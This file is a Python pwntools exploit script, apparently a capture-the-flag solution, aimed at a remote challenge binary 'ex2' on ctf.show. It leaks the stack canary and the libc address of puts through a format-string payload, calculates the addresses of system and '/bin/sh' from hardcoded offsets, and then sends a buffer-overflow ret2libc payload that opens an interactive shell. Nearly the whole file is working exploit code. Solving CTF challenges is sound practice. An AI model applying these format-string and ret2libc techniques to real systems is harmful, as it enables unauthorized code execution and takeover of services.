# -*- coding: utf-8 -*-


import pwn
from pwn import *
fileName = './ex2'

'''
[*] '/home/wkyuu/Desktop/temp/ex2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''

p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32

context(log_level='debug', os='linux')
# p = process(fileName)
p = remote('pwn.challenge.ctf.show', 28109)
elf = ELF(fileName)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

gdbscript = '''
break *vuln+55
break *vuln+91
c
'''
# gdb.attach(p, gdbscript = gdbscript)

# bin
bin_func_main = elf.sym['main']
bin_puts_got = elf.got['puts']
bin_puts_plt = elf.sym['puts']

# libc
libc_puts_offset = 0x67360
libc_system_offset = 0x3cd10
libc_str_bin_sh_offset = 0x17b8cf

# libc_puts_offset = 0x70ea0
# libc_system_offset = 0x47040
# libc_str_bin_sh_offset = 0x1b40ce

# leak canary, libc
logger('leak canary, libc')
payload = b'aaa' + b'%10$s' + b'bbb' + b'%31$p' + p32(bin_puts_got)
p.sendlineafter(b'Hello Hacker!\n', payload)

p.recvuntil(b'aaa')
leak_puts = u32(p.recv(4))
p.recvuntil(b'bbb')
leak_canary = int(p.recv(10), 16)
print(p.recv())

libc_base = leak_puts - libc_puts_offset
libc_system = libc_base + libc_system_offset
libc_str_bin_sh = libc_base + libc_str_bin_sh_offset

logger('leak_puts', hex(leak_puts), 'a')
logger('libc_base', hex(libc_base), 'a')
logger('libc_system', hex(libc_system), 'a')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'a')
logger('leak_canary', hex(leak_canary), 'a')

# rop
logger('rop')
payload = b'a' * 0x64 + p32(leak_canary) + p32(0) * 3 + p32(libc_system) + p32(0) + p32(libc_str_bin_sh)
p.sendline(payload)
p.interactive()
